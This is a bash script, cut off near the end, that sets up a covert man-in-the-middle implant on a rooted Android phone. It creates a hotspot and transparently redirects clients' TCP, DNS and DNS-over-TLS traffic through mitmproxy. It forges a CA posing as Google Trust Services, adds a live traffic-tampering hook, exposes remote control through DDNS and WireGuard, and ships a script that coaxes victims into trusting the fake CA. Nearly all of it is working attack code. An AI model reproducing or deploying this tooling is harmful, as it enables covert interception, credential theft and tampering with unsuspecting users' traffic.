#!/data/data/com.termux/files/usr/bin/bash
set -euo pipefail

# ============================================================================
#  Stealth MITM Proxy – Grey‑Hat Field Implant
#  Rooted Motorola (Termux) – Uses Android `cmd wifi start-softap`
#  Client bootstrap now root‑free (user CA only).
# ============================================================================

# ---------- configuration block ----------
PROXY_PORT=8080
MITMWEB_PORT=8081
WEBUI_HTTPS_PORT=9443
WEBUI_USER="admin"
DUCKDNS_TOKEN="your-token"
NOIP_USER="your-noip-user"
NOIP_PASS="your-noip-pass"
HOST1="pet-my.duckdns.org"
HOST2="suck.sytes.net"
HOTSPOT_SSID="StealthNet"
HOTSPOT_PASS="StrongHotspotPassword"
ENABLE_WG=1
WG_PORT=51820
WG_SERVER_IP="10.9.0.1"
WG_CLIENT_IP="10.9.0.2"
BASE_DIR="/data/local/tmp/mitm_stealth"
ENABLE_HOTSPOT=1
# ------------------------------------------

export PATH="/data/data/com.termux/files/usr/bin:/data/data/com.termux/files/usr/sbin:/system/bin:/system/xbin:/sbin:$PATH"

die()  { echo "FATAL: $*" >&2; exit 1; }
warn() { echo "WARN:  $*" >&2; }
info() { echo "[*]   $*"; }

[ "$(id -u)" -ne 0 ] && die "Run as root."

for cmd in id grep sed awk ip; do
    command -v "$cmd" >/dev/null 2>&1 || die "Required command '$cmd' not found."
done

# ---------- internet check ----------
if ping -c1 -W2 1.1.1.1 >/dev/null 2>&1; then
    HAS_INTERNET=1; info "Internet connectivity: OK"
else
    HAS_INTERNET=0; warn "No internet. Assuming dependencies are pre‑installed."
fi

mkdir -p "$BASE_DIR"/{certs,scripts,logs,nginx,wireguard,bin}
chmod 755 "$BASE_DIR"/{scripts,logs,nginx,wireguard,bin}
chmod 700 "$BASE_DIR"/certs

if [ "$HAS_INTERNET" -eq 1 ]; then
    if command -v pkg >/dev/null 2>&1; then
        pkg update -y && pkg upgrade -y
        pkg install -y python dnsmasq nginx curl openssl iptables iproute2 wireguard-tools tsu procps coreutils
    elif command -v apt >/dev/null 2>&1; then
        apt update -y -q && apt upgrade -y -q || warn "apt update failed, continuing..."
        apt install -y -q python python-pip dnsmasq nginx curl openssl \
            iptables iproute2 wireguard-tools tsu procps coreutils 2>&1 | tail -5
    else
        warn "No package manager found. Ensure required packages are installed manually."
    fi
    PIP=$(command -v pip3 2>/dev/null || command -v pip 2>/dev/null || true)
    [ -z "$PIP" ] && warn "pip not found — mitmproxy/Flask may be missing" || {
        "$PIP" install --upgrade pip -q || true
        "$PIP" install mitmproxy Flask flask-httpauth dnslib -q || warn "pip install failed, some features may not work"
    }
else
    for bin in dnsmasq nginx openssl iptables; do
        command -v "$bin" >/dev/null 2>&1 || warn "Binary '$bin' not found – may fail."
    done
    command -v mitmweb >/dev/null 2>&1 || warn "mitmweb missing."
    python3 -c "import dnslib" 2>/dev/null || warn "dnslib missing; DoT proxy will fail."
fi

command -v openssl >/dev/null 2>&1 || die "openssl not found after package installation. Aborting."

PROXY_PASS=$(openssl rand -base64 12)
WEBUI_PASS=$(openssl rand -base64 12)
CREDS_FILE="$BASE_DIR/.credentials"
echo "Proxy auth: admin / $PROXY_PASS" > "$CREDS_FILE"
echo "Web UI auth: $WEBUI_USER / $WEBUI_PASS" >> "$CREDS_FILE"
chmod 600 "$CREDS_FILE"
info "Random credentials generated. Saved to $CREDS_FILE"

# ---------- proxy user (best-effort on Motorola/Termux) ----------
if ! id proxy >/dev/null 2>&1; then
    if command -v useradd >/dev/null 2>&1; then
        useradd -M -s /bin/false proxy 2>/dev/null || true
    fi
    if ! id proxy >/dev/null 2>&1; then
        echo "proxy:x:9999:9999::/nonexistent:/bin/false" >> /etc/passwd 2>/dev/null \
            || warn "Cannot add proxy user — mitmproxy will run as root"
        echo "proxy:x:9999:" >> /etc/group 2>/dev/null || true
    fi
else
    info "Proxy user already exists."
fi
PROXY_UID=$(id -u proxy 2>/dev/null || echo 0)

# ---------- CA generation ----------
if [ -f "$BASE_DIR/certs/mitmproxy-ca-cert.pem" ] && [ -f "$BASE_DIR/certs/mitmproxy-ca-key.pem" ]; then
    warn "CA certificates already exist. Keeping existing ones."
else
    info "Generating CA..."
    openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -nodes \
      -keyout "$BASE_DIR/certs/mitmproxy-ca-key.pem" \
      -out "$BASE_DIR/certs/mitmproxy-ca-cert.pem" \
      -subj "/C=US/O=Google Trust Services/CN=GTS CA 1O1" 2>/dev/null || die "CA generation failed"
    openssl x509 -in "$BASE_DIR/certs/mitmproxy-ca-cert.pem" \
      -outform DER -out "$BASE_DIR/certs/mitmproxy-ca.der" 2>/dev/null
    chmod 600 "$BASE_DIR/certs/mitmproxy-ca-key.pem"
    chmod 644 "$BASE_DIR/certs/mitmproxy-ca-cert.pem"
    chmod 644 "$BASE_DIR/certs/mitmproxy-ca.der"
fi
[ -f "$BASE_DIR/certs/mitmproxy-ca-key.pem" ] && chmod 600 "$BASE_DIR/certs/mitmproxy-ca-key.pem"

# ---------- upstream interface ----------
UPSTREAM_IFACE=""
UPSTREAM_IFACE=$(ip route get 8.8.8.8 2>/dev/null | awk 'NR==1{for(i=1;i<=NF;i++){if($i=="dev"){print $(i+1);exit}}}') || true
[ -z "$UPSTREAM_IFACE" ] && UPSTREAM_IFACE="rmnet_data0"
info "Upstream interface: $UPSTREAM_IFACE"

# ---------- firewall script ----------
FW_SCRIPT="$BASE_DIR/scripts/firewall.sh"
cat > "$FW_SCRIPT" << FWEOF
#!/system/bin/sh
set -eu
UPSTREAM_IFACE="${UPSTREAM_IFACE}"
PROXY_PORT=${PROXY_PORT}
INTERNAL_IFACE="\${1:-\${INTERNAL_IFACE:-}}"
[ -z "\$INTERNAL_IFACE" ] && { echo "FATAL: INTERNAL_IFACE not set" >&2; exit 1; }

echo 1 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || echo "WARN: Cannot enable ip_forward" >&2

iptables -t nat -F 2>/dev/null || true
iptables -F 2>/dev/null || true
ip6tables -F 2>/dev/null || true
ip6tables -t nat -F 2>/dev/null || true

ip6tables -P INPUT DROP 2>/dev/null || true
ip6tables -P FORWARD DROP 2>/dev/null || true
ip6tables -P OUTPUT DROP 2>/dev/null || true

iptables -t nat -A PREROUTING -i "\$INTERNAL_IFACE" -p tcp -j REDIRECT --to-port "\$PROXY_PORT" || {
    echo "FATAL: TCP redirect rule failed for \$INTERNAL_IFACE" >&2; exit 1; }
iptables -t nat -A PREROUTING -i "\$INTERNAL_IFACE" -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
iptables -t nat -A PREROUTING -i "\$INTERNAL_IFACE" -p tcp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
iptables -t nat -A PREROUTING -i "\$INTERNAL_IFACE" -p tcp --dport 853 -j REDIRECT --to-port 853 2>/dev/null || true

iptables -A FORWARD -i "\$INTERNAL_IFACE" -p udp --dport 443 -j DROP 2>/dev/null || true
iptables -A INPUT  -i "\$INTERNAL_IFACE" -p udp --dport 443 -j DROP 2>/dev/null || true

if ip link show wg0 >/dev/null 2>&1; then
    iptables -t nat -A PREROUTING -i wg0 -p tcp -j REDIRECT --to-port "\$PROXY_PORT" 2>/dev/null || true
    iptables -t nat -A PREROUTING -i wg0 -p udp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
    iptables -t nat -A PREROUTING -i wg0 -p tcp --dport 53 -j REDIRECT --to-port 5353 2>/dev/null || true
    iptables -t nat -A PREROUTING -i wg0 -p tcp --dport 853 -j REDIRECT --to-port 853 2>/dev/null || true
    iptables -A FORWARD -i wg0 -p udp --dport 443 -j DROP 2>/dev/null || true
    iptables -A INPUT  -i wg0 -p udp --dport 443 -j DROP 2>/dev/null || true
fi

iptables -t nat -A POSTROUTING -o "\$UPSTREAM_IFACE" -j MASQUERADE 2>/dev/null || true

PROXY_UID="${PROXY_UID}"
if [ "\$PROXY_UID" -gt 0 ] 2>/dev/null; then
    iptables -t nat -A OUTPUT -m owner --uid-owner "\$PROXY_UID" -j ACCEPT 2>/dev/null || true
fi

for port in "\$PROXY_PORT" 853 5353; do
    iptables -A INPUT -i "\$UPSTREAM_IFACE" -p tcp --dport "\$port" -j DROP 2>/dev/null || true
done
FWEOF
chmod +x "$FW_SCRIPT"

# ---------- dnsmasq config ----------
DNSMASQ_CONF="$BASE_DIR/dnsmasq.conf"
CARRIER_DNS=$(getprop net.dns1 2>/dev/null || echo "8.8.4.4")
cat > "$DNSMASQ_CONF" << DEOF
no-resolv
server=8.8.8.8
server=1.1.1.1
server=9.9.9.9
server=${CARRIER_DNS}
listen-address=0.0.0.0
port=5353
cache-size=2000
log-queries
log-facility=${BASE_DIR}/logs/dnsmasq.log
interface=__INTERNAL_IFACE__
dhcp-range=__DHCP_START__,__DHCP_END__,12h
dhcp-option=3,__GATEWAY_IP__
DEOF

# ---------- DoT proxy ----------
DOT_PROXY="$BASE_DIR/scripts/dot_proxy.py"
if [ ! -f "$DOT_PROXY" ]; then
    cat > "$DOT_PROXY" << 'DOTEOF'
#!/usr/bin/env python3
import ssl, socket, struct, logging, sys, select, os
from concurrent.futures import ThreadPoolExecutor
try:
    from dnslib import DNSRecord
except ImportError:
    print("dnslib not installed. DoT proxy will not log queries.", file=sys.stderr)

LISTEN_PORT=853
UPSTREAM=("1.1.1.1", 853)
CERT="/data/local/tmp/mitm_stealth/certs/mitmproxy-ca-cert.pem"
KEY="/data/local/tmp/mitm_stealth/certs/mitmproxy-ca-key.pem"
LOG="/data/local/tmp/mitm_stealth/logs/dot_proxy.log"
logging.basicConfig(filename=LOG, level=logging.INFO,
                    format="%(asctime)s [DoT] %(message)s")
executor = ThreadPoolExecutor(max_workers=20)

def relay(client, addr):
    tls_client = tls_up = None
    try:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(CERT, KEY)
        tls_client = ctx.wrap_socket(client, server_side=True)
        usock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        usock.settimeout(10)
        ctx_up = ssl.create_default_context()
        tls_up = ctx_up.wrap_socket(usock, server_hostname="1.1.1.1")
        tls_up.connect(UPSTREAM)
        socks = [tls_client, tls_up]
        while True:
            r, _, _ = select.select(socks, [], [], 30)
            if tls_client in r:
                data = tls_client.recv(4096)
                if not data: break
                if len(data) > 2:
                    try:
                        q = DNSRecord.parse(data[2:])
                        logging.info(f"Query: {q.q.qname} from {addr}")
                    except: pass
                tls_up.sendall(data)
            if tls_up in r:
                data = tls_up.recv(4096)
                if not data: break
                tls_client.sendall(data)
    except Exception as e:
        logging.error(f"Relay error: {e}")
    finally:
        for s in (tls_client, tls_up):
            try: s.close()
            except: pass

def main():
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    srv.bind(("0.0.0.0", LISTEN_PORT))
    srv.listen(10)
    logging.info("DoT proxy started on port %d", LISTEN_PORT)
    while True:
        cl, addr = srv.accept()
        executor.submit(relay, cl, addr)

if __name__ == "__main__":
    main()
DOTEOF
    chmod +x "$DOT_PROXY"
fi

# ---------- mitmproxy launcher ----------
MITM_LAUNCHER="$BASE_DIR/scripts/run_mitmproxy.sh"
cat > "$MITM_LAUNCHER" << MITMEOF
#!/data/data/com.termux/files/usr/bin/bash
export PATH="/data/data/com.termux/files/usr/bin:\$PATH"
cd ${BASE_DIR}

command -v mitmweb >/dev/null 2>&1 || { echo "FATAL: mitmweb not found" >&2; exit 1; }

exec mitmweb \\
  --mode transparent \\
  --listen-port ${PROXY_PORT} \\
  --web-host 127.0.0.1 --web-port ${MITMWEB_PORT} \\
  --web-password "${PROXY_PASS}" \\
  --ssl-insecure \\
  -s ${BASE_DIR}/scripts/tamper_script.py \\
  --set script_watch=true \\
  --set confdir=${BASE_DIR}/certs \\
  >> ${BASE_DIR}/logs/mitmproxy.log 2>&1
MITMEOF
chmod +x "$MITM_LAUNCHER"

# ---------- tamper script ----------
TAMPER_SCRIPT="$BASE_DIR/scripts/tamper_script.py"
if [ ! -f "$TAMPER_SCRIPT" ]; then
    cat > "$TAMPER_SCRIPT" << 'TAMPER'
from mitmproxy import http, ctx
import logging

def request(flow: http.HTTPFlow) -> None:
    if flow.error and "certificate" in str(flow.error).lower():
        logging.getLogger("mitmproxy").warning(f"SSL/Pinning error: {flow.error}")

def response(flow: http.HTTPFlow) -> None:
    pass
TAMPER
fi

# ---------- Flask admin UI ----------
ADMIN_UI="$BASE_DIR/scripts/admin_ui.py"
if [ ! -f "$ADMIN_UI" ]; then
    cat > "$ADMIN_UI" << 'FLASKUI'
import os, subprocess, sys
from flask import Flask, render_template_string, request, redirect, url_for, session, jsonify

BASE="/data/local/tmp/mitm_stealth"
TAMPER=BASE+"/scripts/tamper_script.py"
SECRET_FILE=BASE+"/nginx/.flask_secret"
os.makedirs(os.path.dirname(SECRET_FILE), exist_ok=True)
if not os.path.exists(SECRET_FILE):
    with open(SECRET_FILE,'wb') as f: f.write(os.urandom(24))
with open(SECRET_FILE,'rb') as f: secret = f.read()

app=Flask(__name__)
app.secret_key=secret

HTML_TEMPLATE=r"""
<!DOCTYPE html>
<html>
<head><title>Stealth MITM Panel</title>
<meta name="viewport" content="width=device-width, initial-scale=1">
<style>
body{font-family:Arial; margin:20px; background:#111; color:#eee;}
a{color:#4af;}
.tabcontent{display:none; padding:10px; border:1px solid #444; border-top:none; background:#222;}
.tab{overflow:hidden; border:1px solid #444; background-color:#333;}
.tab button{background-color:inherit; float:left; border:none; outline:none; cursor:pointer;
  padding:14px 16px; transition:0.3s; color:#ccc;}
.tab button:hover{background-color:#555;}
.tab button.active{background-color:#222; color:white;}
pre{white-space:pre-wrap; word-wrap:break-word; background:#000; padding:10px; max-height:300px; overflow:auto;}
button{background:#238636; color:white; border:none; padding:8px 16px; cursor:pointer; border-radius:4px; margin:2px;}
</style></head>
<body>
<h2>Stealth MITM Proxy</h2>
<div class="tab">
  <button class="tablinks" onclick="openTab(event,'Status')" id="defaultOpen">Status</button>
  <button class="tablinks" onclick="openTab(event,'Tamper')">Tamper Script</button>
  <button class="tablinks" onclick="openTab(event,'Logs')">Logs</button>
  <button class="tablinks" onclick="openTab(event,'Actions')">Actions</button>
</div>
<div id="Status" class="tabcontent">
  <h3>Service Status</h3>
  <pre id="status_data">Loading...</pre>
</div>
<div id="Tamper" class="tabcontent">
  <h3>Edit Tamper Script</h3>
  <form method="post" action="/update_tamper">
    <textarea name="tamper_code" rows="20" style="width:100%; background:#000; color:#0f0;">{{ tamper_content }}</textarea><br>
    <button type="submit">Save & Reload</button>
  </form>
  <p style="color:red">{{ tamper_error }}</p>
</div>
<div id="Logs" class="tabcontent">
  <h3>Recent Logs</h3>
  <pre id="log_data">Loading...</pre>
</div>
<div id="Actions" class="tabcontent">
  <h3>Control</h3>
  <button onclick="fetch('/restart_proxy')">Restart mitmproxy</button>
  <button onclick="fetch('/restart_dns')">Restart DNS</button>
  <button onclick="fetch('/restart_all')">Restart All</button>
</div>
<script>
function openTab(evt, tabName) {
  var i, tabcontent, tablinks;
  tabcontent = document.getElementsByClassName("tabcontent");
  for (i=0; i<tabcontent.length; i++) tabcontent[i].style.display = "none";
  tablinks = document.getElementsByClassName("tablinks");
  for (i=0; i<tablinks.length; i++) tablinks[i].className = tablinks[i].className.replace(" active","");
  document.getElementById(tabName).style.display = "block";
  if(evt) evt.currentTarget.className += " active";
  if(tabName=="Status") loadStatus();
  if(tabName=="Logs") loadLogs();
}
function loadStatus(){
  fetch('/api/status').then(r=>r.text()).then(t=>{ document.getElementById('status_data').textContent = t; });
}
function loadLogs(){
  fetch('/api/logs').then(r=>r.text()).then(t=>{ document.getElementById('log_data').textContent = t; });
}
document.getElementById("defaultOpen").click();
</script>
</body></html>
"""

@app.route('/')
def index():
    try:
        with open(TAMPER,'r') as f:
            tamper = f.read()
    except:
        tamper = "# Error reading tamper script"
    return render_template_string(HTML_TEMPLATE, tamper_content=tamper, tamper_error="")

@app.route('/update_tamper', methods=['POST'])
def update_tamper():
    code = request.form.get('tamper_code','')
    try:
        compile(code, TAMPER, 'exec')
        with open(TAMPER,'w') as f:
            f.write(code)
        return redirect(url_for('index'))
    except SyntaxError as e:
        with open(TAMPER,'r') as f:
            current = f.read()
        return render_template_string(HTML_TEMPLATE, tamper_content=current, tamper_error=f"Syntax error: {e}")
    except Exception as e:
        with open(TAMPER,'r') as f:
            current = f.read()
        return render_template_string(HTML_TEMPLATE, tamper_content=current, tamper_error=f"Error: {e}")

@app.route('/api/status')
def api_status():
    out = []
    for svc in ['mitmweb','dnsmasq','nginx','dot_proxy.py']:
        pidof = subprocess.run(['pidof',svc], capture_output=True, text=True)
        out.append(f"{svc}: {'running' if pidof.returncode==0 else 'stopped'}")
    return '\n'.join(out)

@app.route('/api/logs')
def api_logs():
    log_files = [BASE+'/logs/mitmproxy.log', BASE+'/logs/dnsmasq.log', BASE+'/logs/run_all.log']
    lines=[]
    for log in log_files:
        if os.path.exists(log):
            try:
                with open(log,'r') as f:
                    content = f.readlines()[-50:]
                    lines.append(f"--- {os.path.basename(log)} ---")
                    lines.extend(content)
            except:
                pass
    return ''.join(lines)

@app.route('/restart_proxy')
def restart_proxy():
    subprocess.run(['pkill','-f','mitmweb'], capture_output=True)
    return "mitmproxy restart triggered"

@app.route('/restart_dns')
def restart_dns():
    subprocess.run(['pkill','dnsmasq'], capture_output=True)
    subprocess.Popen(['dnsmasq','-C',BASE+'/dnsmasq.conf'])
    return "dnsmasq restart triggered"

@app.route('/restart_all')
def restart_all():
    subprocess.run([BASE+'/bin/mitm-ctl','stop'], capture_output=True)
    subprocess.Popen([BASE+'/bin/mitm-ctl','start'])
    return "Full restart triggered"

if __name__ == '__main__':
    app.run(host='127.0.0.1', port=5000, debug=False)
FLASKUI
    chmod +x "$ADMIN_UI"
fi

# ---------- nginx ----------
if [ ! -f "$BASE_DIR/certs/webui-cert.pem" ] || [ ! -f "$BASE_DIR/certs/webui-key.pem" ]; then
    info "Generating Web UI certificate..."
    if openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
      -keyout "$BASE_DIR/certs/webui-key.pem" \
      -out "$BASE_DIR/certs/webui-cert.pem" \
      -subj "/CN=${HOST1}" -addext "subjectAltName=DNS:${HOST1},DNS:${HOST2}" 2>/dev/null; then
        :
    else
        cat > /tmp/ssl_mitm.conf << SSLCONF
[req]
distinguished_name=req_distinguished_name
x509_extensions=v3_req
prompt=no
[req_distinguished_name]
CN=${HOST1}
[v3_req]
subjectAltName=@alt_names
[alt_names]
DNS.1=${HOST1}
DNS.2=${HOST2}
SSLCONF
        openssl req -x509 -nodes -days 3650 -newkey rsa:2048 \
          -keyout "$BASE_DIR/certs/webui-key.pem" \
          -out "$BASE_DIR/certs/webui-cert.pem" \
          -config /tmp/ssl_mitm.conf 2>/dev/null || die "SSL certificate generation failed"
        rm -f /tmp/ssl_mitm.conf
    fi
    chmod 600 "$BASE_DIR/certs/webui-key.pem"
else
    info "Web UI certificate exists."
fi

echo "${WEBUI_USER}:$(openssl passwd -apr1 "${WEBUI_PASS}")" > "$BASE_DIR/nginx/.htpasswd"

cat > "$BASE_DIR/nginx/nginx.conf" << NGXEOF
worker_processes 1;
pid ${BASE_DIR}/nginx/nginx.pid;
error_log ${BASE_DIR}/logs/nginx_error.log;
events { worker_connections 32; }
http {
    access_log ${BASE_DIR}/logs/nginx_access.log;
    server {
        listen ${WEBUI_HTTPS_PORT} ssl;
        ssl_certificate     ${BASE_DIR}/certs/webui-cert.pem;
        ssl_certificate_key ${BASE_DIR}/certs/webui-key.pem;
        auth_basic "Stealth Panel";
        auth_basic_user_file ${BASE_DIR}/nginx/.htpasswd;

        location /mitmweb/ {
            proxy_pass http://127.0.0.1:${MITMWEB_PORT}/;
            proxy_http_version 1.1;
            proxy_set_header Upgrade \$http_upgrade;
            proxy_set_header Connection "upgrade";
        }
        location / {
            proxy_pass http://127.0.0.1:5000/;
        }
        location /ca.der {
            alias ${BASE_DIR}/certs/mitmproxy-ca.der;
            add_header Content-Type application/x-x509-ca-cert;
        }
        location /bootstrap {
            alias ${BASE_DIR}/scripts/bootstrap_client.sh;
            add_header Content-Type text/plain;
        }
    }
}
NGXEOF

# ---------- client bootstrap script (ROOT‑FREE – installs as user CA) ----------
cat > "$BASE_DIR/scripts/bootstrap_client.sh" << 'BOOTSTRAP'
#!/system/bin/sh
set -e
SERVER_IP="__SERVER_IP__"
SERVER_PORT="__SERVER_PORT__"

echo "[*] Downloading MITM CA..."
curl -sk "https://${SERVER_IP}:${SERVER_PORT}/ca.der" -o /sdcard/Download/mitm-ca.der
if [ -f /sdcard/Download/mitm-ca.der ]; then
    echo "[*] Opening certificate installer – please tap OK to install."
    # Launch the system cert installer – works without root
    am start -a android.intent.action.VIEW \
        -t application/x-x509-ca-cert \
        -d "file:///sdcard/Download/mitm-ca.der" \
        -n com.android.certinstaller/.CertInstallerMain 2>/dev/null \
        || am start -a android.intent.action.VIEW \
            -t application/x-x509-ca-cert \
            -d "file:///sdcard/Download/mitm-ca.der" 2>/dev/null \
        || {
            echo "Could not open installer automatically."
            echo "Please navigate to Settings → Security → Install a certificate → CA certificate"
            echo "and select the file /sdcard/Download/mitm-ca.der manually."
        }
    echo "[+] CA certificate ready. After installation, trust will be added to user store."
    echo "    Some apps may still not trust it (they require a system CA)."
else
    echo "Download failed. Check connectivity."
    exit 1
fi
BOOTSTRAP
chmod +x "$BASE_DIR/scripts/bootstrap_client.sh"

# ---------- WireGuard ----------
if [ "$ENABLE_WG" -eq 1 ]; then
    info "Configuring WireGuard..."
    mkdir -p "$BASE_DIR/wireguard"
    cd "$BASE_DIR/wireguard"
    if [ ! -f server_private.key ]; then
        wg genkey > server_private.key
        wg pubkey < server_private.key > server_public.key
    fi
    if [ ! -f client_private.key ]; then
        wg genkey > client_private.key
        wg pubkey < client_private.key > client_public.key
    fi
    chmod 600 server_private.key client_private.key
    cat > wg0.conf << WGCONF
[Interface]
Address=${WG_SERVER_IP}/24
ListenPort=${WG_PORT}
PrivateKey=$(cat server_private.key)

[Peer]
PublicKey=$(cat client_public.key)
AllowedIPs=${WG_CLIENT_IP}/32
WGCONF
    chmod 600 wg0.conf
    cat > client.conf << CLIENTCONF
[Interface]
PrivateKey=$(cat client_private.key)
Address=${WG_CLIENT_IP}/24
DNS=${WG_SERVER_IP}

[Peer]
PublicKey=$(cat server_public.key)
Endpoint=${HOST1}:${WG_PORT}
AllowedIPs=0.0.0.0/0
PersistentKeepalive=25
CLIENTCONF
    cd "$BASE_DIR"
fi

# ---------- DDNS updater ----------
DDNS_SCRIPT="$BASE_DIR/scripts/update_ddns.sh"
if [ "$DUCKDNS_TOKEN" != "your-token" ] || [ "$NOIP_USER" != "your-noip-user" ]; then
    cat > "$DDNS_SCRIPT" << 'DDNSSH'
#!/system/bin/sh
set -eu
BASE=/data/local/tmp/mitm_stealth
LOG="$BASE/logs/ddns.log"
mkdir -p "$(dirname "$LOG")"

log() { echo "$(date '+%F %T') $*" >> "$LOG"; }

get_ip() {
    for s in ifconfig.me icanhazip.com ipinfo.io/ip; do
        IP=$(curl -sk --max-time 5 "https://$s" 2>/dev/null || true)
        if [ -n "$IP" ] && echo "$IP" | grep -qE '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$'; then
            echo "$IP"
            return
        fi
    done
    echo ""
}

update_duckdns() {
    if [ "${DUCKDNS_TOKEN}" = "your-token" ] || [ -z "${DUCKDNS_TOKEN}" ]; then
        return
    fi
    local domains="${HOST1%%.*}"
    local url="https://www.duckdns.org/update?domains=${domains}&token=${DUCKDNS_TOKEN}&ip=${CURRENT_IP}"
    local resp
    resp=$(curl -sk --max-time 10 "$url" 2>/dev/null || true)
    log "DuckDNS update: $resp"
}

update_noip() {
    if [ "${NOIP_USER}" = "your-noip-user" ] || [ -z "${NOIP_USER}" ]; then
        return
    fi
    local resp
    resp=$(curl -sk --max-time 10 -u "${NOIP_USER}:${NOIP_PASS}" \
        "https://dynupdate.no-ip.com/nic/update?hostname=${HOST2}&myip=${CURRENT_IP}" 2>/dev/null || true)
    log "No-IP update: $resp"
}

while true; do
    CURRENT_IP=$(get_ip)
    if [ -z "$CURRENT_IP" ]; then
        log "ERROR: Could not determine public IP."
        sleep 300
        continue
    fi
    log "Current IP: $CURRENT_IP"
    update_duckdns
    update_noip
    sleep 300
done
DDNSSH
    chmod +x "$DDNS_SCRIPT"
else
    cat > "$DDNS_SCRIPT" << 'DDNSNOOP'
#!/system/bin/sh
exit 0
DDNSNOOP
    chmod +x "$DDNS_SCRIPT"
    info "DDNS not configured."
fi

# ---------- runtime config ----------
RUNTIME_CFG="$BASE_DIR/runtime.conf"
cat > "$RUNTIME_CFG" << RUNTIMECFG
export BASE_DIR="${BASE_DIR}"
export PROXY_PORT="${PROXY_PORT}"
export MITMWEB_PORT="${MITMWEB_PORT}"
export WEBUI_HTTPS_PORT="${WEBUI_HTTPS_PORT}"
export HOTSPOT_SSID="${HOTSPOT_SSID}"
export HOTSPOT_PASS="${HOTSPOT_PASS}"
export ENABLE_HOTSPOT="${ENABLE_HOTSPOT}"
export ENABLE_WG="${ENABLE_WG}"
export DUCKDNS_TOKEN="${DUCKDNS_TOKEN}"
export HOST1="${HOST1}"
export HOST2="${HOST2}"
export NOIP_USER="${NOIP_USER}"
export NOIP_PASS="${NOIP_PASS}"
export UPSTREAM_IFACE="${UPSTREAM_IFACE}"
export PROXY_PASS="${PROXY_PASS}"
export WEBUI_PASS="${WEBUI_PASS}"
RUNTIMECFG
chmod 644 "$RUNTIME_CFG"

# ---------- master runner ----------
cat > "$BASE_DIR/scripts/run_all.sh" << 'RUNALL'
#!/system/bin/sh
set -eu

. "/data/local/tmp/mitm_stealth/runtime.conf" 2>/dev/null || true

BASE="${BASE_DIR:-/data/local/tmp/mitm_stealth}"
LOG="$BASE/logs/run_all.log"
mkdir -p "$BASE/logs"

log() { echo "$(date '+%F %T') $*" | tee -a "$LOG"; }

export PATH="/data/data/com.termux/files/usr/bin:/data/data/com.termux/files/usr/sbin:/system/bin:/system/xbin:/sbin:$PATH"

INTERNAL_IFACE=""
GATEWAY_IP="192.168.42.1"
DHCP_START="192.168.42.10"
DHCP_END="192.168.42.250"

if [ "${ENABLE_HOTSPOT:-1}" -eq 1 ]; then
    log "Starting hotspot via Android API..."
    svc wifi disable 2>/dev/null || true
    sleep 1

    cmd wifi start-softap "${HOTSPOT_SSID:-StealthNet}" wpa2 "${HOTSPOT_PASS:-StrongHotspotPassword}" 2>&1 | tee -a "$LOG" || {
        log "ERROR: SoftAP start failed. Aborting."
        exit 1
    }
    sleep 3

    for iface in $(ip -o link show | awk -F': ' '{print $2}' | grep -v lo); do
        if ip addr show "$iface" 2>/dev/null | grep -qE '192\.168\.(42|43)\.1'; then
            INTERNAL_IFACE="$iface"
            break
        fi
    done
    if [ -z "$INTERNAL_IFACE" ]; then
        for iface in ap0 swlan0 wlan1 wlan0; do
            if ip link show "$iface" >/dev/null 2>&1; then
                INTERNAL_IFACE="$iface"
                log "WARN: AP iface not autodetected; assuming $iface"
                break
            fi
        done
    fi
    [ -z "$INTERNAL_IFACE" ] && { log "FATAL: cannot detect AP interface"; exit 1; }

    IFACE_IP=$(ip -o addr show "$INTERNAL_IFACE" 2>/dev/null | awk '/inet /{split($4,a,"/"); print a[1]; exit}')
    if [ -n "$IFACE_IP" ] && [ "$IFACE_IP" != "192.168.42.1" ]; then
        GATEWAY_IP="$IFACE_IP"
        PREFIX=$(echo "$GATEWAY_IP" | sed 's/\.[^.]*$/\./')
        DHCP_START="${PREFIX}10"
        DHCP_END="${PREFIX}250"
    fi

    log "Internal interface: $INTERNAL_IFACE, gateway: $GATEWAY_IP, DHCP: $DHCP_START-$DHCP_END"

    if grep -q '__INTERNAL_IFACE__' "$BASE/dnsmasq.conf" 2>/dev/null; then
        sed -i \
            -e "s|__INTERNAL_IFACE__|$INTERNAL_IFACE|g" \
            -e "s|__DHCP_START__|$DHCP_START|g" \
            -e "s|__DHCP_END__|$DHCP_END|g" \
            -e "s|__GATEWAY_IP__|$GATEWAY_IP|g" \
            "$BASE/dnsmasq.conf"
    fi
    if grep -q '__SERVER_IP__' "$BASE/scripts/bootstrap_client.sh" 2>/dev/null; then
        sed -i \
            -e "s|__SERVER_IP__|$GATEWAY_IP|g" \
            -e "s|__SERVER_PORT__|${WEBUI_HTTPS_PORT:-9443}|g" \
            "$BASE/scripts/bootstrap_client.sh"
    fi

    if sh "$BASE/scripts/firewall.sh" "$INTERNAL_IFACE"; then
        if ! iptables -t nat -C PREROUTING -i "$INTERNAL_IFACE" -p tcp \
                -j REDIRECT --to-port "${PROXY_PORT:-8080}" 2>/dev/null; then
            log "FATAL: Firewall redirect rule missing after apply — aborting"
            iptables -t nat -F; iptables -F
            echo 0 > /proc/sys/net/ipv4/ip_forward 2>/dev/null || true
            exit 1
        fi
        log "Firewall OK"
    else
        log "FATAL: firewall.sh exited non-zero"
        exit 1
    fi

    pkill dnsmasq 2>/dev/null || true
    sleep 1
    dnsmasq -C "$BASE/dnsmasq.conf" 2>&1 | tee -a "$LOG" || log "WARN: dnsmasq failed to start"
else
    sh "$BASE/scripts/firewall.sh" "wlan0"
fi

# WireGuard
if [ "${ENABLE_WG:-1}" -eq 1 ] && [ -f "$BASE/wireguard/wg0.conf" ]; then
    if command -v wg-quick >/dev/null 2>&1; then
        wg-quick up "$BASE/wireguard/wg0.conf" 2>&1 | tee -a "$LOG" || log "WARN: wg-quick failed"
        sh "$BASE/scripts/firewall.sh" "$INTERNAL_IFACE" 2>/dev/null || true
    else
        log "WARN: wg-quick not found"
    fi
fi

PYTHON=$(command -v python3 2>/dev/null || command -v python 2>/dev/null || true)
